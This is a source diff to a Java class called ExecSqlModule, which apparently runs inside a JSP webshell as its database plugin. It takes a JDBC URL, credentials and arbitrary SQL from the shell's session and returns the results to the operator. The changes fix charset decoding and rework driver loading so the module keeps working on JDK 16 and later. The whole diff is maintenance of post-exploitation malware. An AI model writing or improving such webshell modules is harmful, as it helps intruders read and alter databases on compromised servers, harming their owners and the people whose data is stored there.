@@ -8,6 +8,8 @@ import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
 import java.sql.Statement;
+import java.util.ArrayList;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -19,10 +21,22 @@ public class ExecSqlModule {
     private Map session;
     private Object servletRequest;
 
-    private String getString(String key) {
+    /**
+     * The client encodes the request values with the database charset, so they
+     * must be decoded with it too -- the platform default is not necessarily
+     * UTF-8 (GBK on a Chinese Windows box, for instance).
+     */
+    private String getString(String key, String charset) {
         Object value = this.session != null ? this.session.get(key) : null;
         if (value instanceof byte[]) {
-            return new String((byte[])value);
+            if (charset == null) {
+                return new String((byte[]) value);
+            }
+            try {
+                return new String((byte[]) value, charset);
+            } catch (java.io.UnsupportedEncodingException e) {
+                return new String((byte[]) value);
+            }
         }
         return value != null ? value.toString() : null;
     }
@@ -36,7 +50,7 @@ public class ExecSqlModule {
         return new byte[]{(byte)(value & 255), (byte)(value >> 8 & 255), (byte)(value >> 16 & 255), (byte)(value >> 24 & 255)};
     }
 
-    private byte[] serialize(Map map) {
+    private byte[] serialize(Map map, String charset) {
         java.util.Iterator keys = map.keySet().iterator();
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 
@@ -44,17 +58,19 @@ public class ExecSqlModule {
             try {
                 String key = (String)keys.next();
                 Object v = map.get(key);
-                outputStream.write(key.getBytes());
+                outputStream.write(key.getBytes(charset));
                 byte[] vb;
                 if (v instanceof byte[]) {
                     outputStream.write(2);
                     vb = (byte[])v;
                 } else if (v instanceof Map) {
                     outputStream.write(1);
-                    vb = this.serialize((Map)v);
+                    vb = this.serialize((Map)v, charset);
                 } else {
                     outputStream.write(2);
-                    vb = v == null ? "NULL".getBytes() : v.toString().getBytes();
+                    // 必须用会话字符集，不能靠平台默认：客户端是按 dbCharset 解码的。
+                    // JDK 17 默认 UTF-8 时恰好一致，JDK 6/中文 Windows 默认 GBK 就乱码。
+                    vb = (v == null ? "NULL" : v.toString()).getBytes(charset);
                 }
 
                 outputStream.write(intToBytes(vb.length));
@@ -66,66 +82,121 @@ public class ExecSqlModule {
         return outputStream.toByteArray();
     }
 
-    private static Connection getConnection(String jdbcUrl, String user, String password) {
-        Connection connection = null;
+    /**
+     * Resolve a JDBC connection without depending on JDK internals.
+     *
+     * The old version went straight at DriverManager's private registry field.
+     * Since JDK 16 java.sql is strongly encapsulated, so that setAccessible()
+     * throws InaccessibleObjectException and the whole SQL feature silently
+     * stopped working. Public APIs cover everything a webapp normally needs;
+     * the reflective read is kept only as a last resort for JDK <= 15 and is
+     * swallowed when the module system blocks it.
+     */
+    /** 连接失败时记录每一步的结果，随 errMsg 一起返回，避免现在这种「只有一句 No suitable driver」的黑盒。 */
+    private static String lastError = "";
 
-        try {
-            Class driverManagerClass = Class.forName("java.sql.DriverManager");
-            Field[] fields = driverManagerClass.getDeclaredFields();
-            Field driversField = null;
-
-            for(int i = 0; i < fields.length; ++i) {
-                Field f = fields[i];
-                if (f.getName().indexOf("rivers") != -1 && List.class.isAssignableFrom(f.getType())) {
-                    driversField = f;
-                    break;
-                }
-            }
-
-            if (driversField != null) {
-                driversField.setAccessible(true);
-                List drivers = (List)driversField.get((Object)null);
-                Iterator it = drivers.iterator();
-
-                while(it.hasNext() && connection == null) {
-                    try {
-                        Object driverInfo = it.next();
-                        Driver driver = null;
-                        if (!(driverInfo instanceof Driver)) {
-                            Field[] infoFields = driverInfo.getClass().getDeclaredFields();
-
-                            for(int j = 0; j < infoFields.length; ++j) {
-                                Field df = infoFields[j];
-                                if (Driver.class.isAssignableFrom(df.getType())) {
-                                    df.setAccessible(true);
-                                    driver = (Driver)df.get(driverInfo);
-                                    break;
-                                }
-                            }
-                        } else {
-                            driver = (Driver)driverInfo;
-                        }
-
-                        if (driver != null) {
-                            Properties props = new Properties();
-                            if (user != null) {
-                                props.put("user", user);
-                            }
-
-                            if (password != null) {
-                                props.put("password", password);
-                            }
-
-                            connection = driver.connect(jdbcUrl, props);
-                        }
-                    } catch (Exception ignored) {
-                    }
-                }
-            }
-        } catch (Exception ignored) {
+    private static Connection getConnection(String jdbcUrl, String user, String password, String driverName) {
+        lastError = "";
+        Properties props = new Properties();
+        if (user != null) {
+            props.put("user", user);
+        }
+        if (password != null) {
+            props.put("password", password);
         }
 
-        return connection;
+        // 1) let DriverManager pick the driver -- works on every JDK.
+        try {
+            return DriverManager.getConnection(jdbcUrl, props);
+        } catch (Throwable t) {
+            lastError += "DriverManager.getConnection: " + t + "; ";
+        }
+
+        // 2) 按驱动类名、用**线程上下文类加载器**直接加载并 connect。
+        //    容器里 TCCL 就是 webapp 的 loader，能看到 WEB-INF/lib；而模块自身的
+        //    loader 是 JSP 用 payload() 无参构造出来的，父链只到系统 loader，
+        //    看不到 WEB-INF/lib —— DriverManager 的 caller-CL 可见性校验因此判它
+        //    不可见（getDrivers() 返回 0），驱动放在 webapp 里就永远连不上。
+        if (driverName != null && driverName.trim().length() > 0) {
+            try {
+                ClassLoader tccl = Thread.currentThread().getContextClassLoader();
+                Class driverClass = Class.forName(driverName.trim(), true, tccl);
+                Connection c = ((Driver) driverClass.newInstance()).connect(jdbcUrl, props);
+                if (c != null) {
+                    return c;
+                }
+                lastError += "TCCL(" + tccl + ") 加载到驱动但 connect 返回 null; ";
+            } catch (Throwable t) {
+                lastError += "TCCL 加载驱动 " + driverName + " 失败: " + t + "; ";
+            }
+        }
+
+        // 3) every driver visible to this classloader, through the public API.
+        List candidates = new ArrayList();
+        try {
+            for (Enumeration e = DriverManager.getDrivers(); e.hasMoreElements();) {
+                candidates.add(e.nextElement());
+            }
+            lastError += "getDrivers=" + candidates.size() + "; ";
+        } catch (Throwable t) {
+            lastError += "getDrivers threw: " + t + "; ";
+        }
+
+        // 4) last resort: read the registry field directly. On JDK 16+ this
+        //    throws InaccessibleObjectException, which we swallow -- paths 1
+        //    and 2 already cover the normal cases.
+        if (candidates.isEmpty()) {
+            try {
+                Field driversField = null;
+                Field[] fields = DriverManager.class.getDeclaredFields();
+                for (int i = 0; i < fields.length; ++i) {
+                    if (fields[i].getName().indexOf("rivers") != -1
+                            && List.class.isAssignableFrom(fields[i].getType())) {
+                        driversField = fields[i];
+                        break;
+                    }
+                }
+
+                if (driversField != null) {
+                    driversField.setAccessible(true);
+                    List registered = (List) driversField.get((Object) null);
+                    for (Iterator it = registered.iterator(); it.hasNext();) {
+                        Object entry = it.next();
+                        if (entry instanceof Driver) {
+                            candidates.add(entry);
+                            continue;
+                        }
+                        Field[] infoFields = entry.getClass().getDeclaredFields();
+                        for (int j = 0; j < infoFields.length; ++j) {
+                            if (Driver.class.isAssignableFrom(infoFields[j].getType())) {
+                                infoFields[j].setAccessible(true);
+                                candidates.add(infoFields[j].get(entry));
+                                break;
+                            }
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+
+        if (candidates.isEmpty()) {
+            try {
+                lastError += "callerCL=" + ExecSqlModule.class.getClassLoader() + "; ";
+            } catch (Throwable ignored) {
+            }
+        }
+
+        for (Iterator it = candidates.iterator(); it.hasNext();) {
+            try {
+                Connection c = ((Driver) it.next()).connect(jdbcUrl, props);
+                if (c != null) {
+                    return c;
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+        return null;
     }
 
     private String base64Encode(byte[] data) {
@@ -194,15 +265,20 @@ public class ExecSqlModule {
 
     public byte[] execute() {
         try {
-            String dbCharset = this.getString("dbCharset");
-            String jdbcURL = this.getString("jdbcURL");
-            String dbDriver = this.getString("dbDriver");
-            String dbUsername = this.getString("dbUsername");
-            String dbPassword = this.getString("dbPassword");
-            String execType = this.getString("execType");
-            if (dbCharset == null || dbCharset.trim().length() > 0) {
+            // A charset name is ASCII, so the platform default is safe here.
+            String dbCharset = this.getString("dbCharset", null);
+            // Was `> 0`, which meant a caller-supplied charset was always
+            // overwritten with UTF-8 and non-UTF-8 databases came back as
+            // mojibake. The payload's own execSql() has the correct `== 0`.
+            if (dbCharset == null || dbCharset.trim().length() == 0) {
                 dbCharset = "UTF-8";
             }
+
+            String jdbcURL = this.getString("jdbcURL", dbCharset);
+            String dbDriver = this.getString("dbDriver", dbCharset);
+            String dbUsername = this.getString("dbUsername", dbCharset);
+            String dbPassword = this.getString("dbPassword", dbCharset);
+            String execType = this.getString("execType", dbCharset);
 
             byte[] execSqlBytes = this.getBytes("execSql");
             String sql = execSqlBytes == null ? null : new String(execSqlBytes, dbCharset);
@@ -249,7 +325,7 @@ public class ExecSqlModule {
                             Connection conn = null;
 
                             try {
-                                conn = getConnection(jdbcURL, dbUsername, dbPassword);
+                                conn = getConnection(jdbcURL, dbUsername, dbPassword, dbDriver);
                             } catch (Exception ignored) {
                             }
 
@@ -306,7 +382,8 @@ public class ExecSqlModule {
                                 result.put("errMsg", "Query OK, " + updateCount + " rows affected");
                             }
                         } catch (Exception e) {
-                            result.put("errMsg", e.getMessage());
+                            result.put("errMsg", e.getMessage()
+                                    + (lastError.length() > 0 ? "  [诊断] " + lastError : ""));
                         }
                     } else {
                         result.put("errMsg", "This database is not supported");
@@ -318,7 +395,7 @@ public class ExecSqlModule {
                 result.put("errMsg", "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql");
             }
 
-            return this.serialize(result);
+            return this.serialize(result, dbCharset);
         } catch (Exception e) {
             return ("Error: " + e.getMessage()).getBytes();
         }
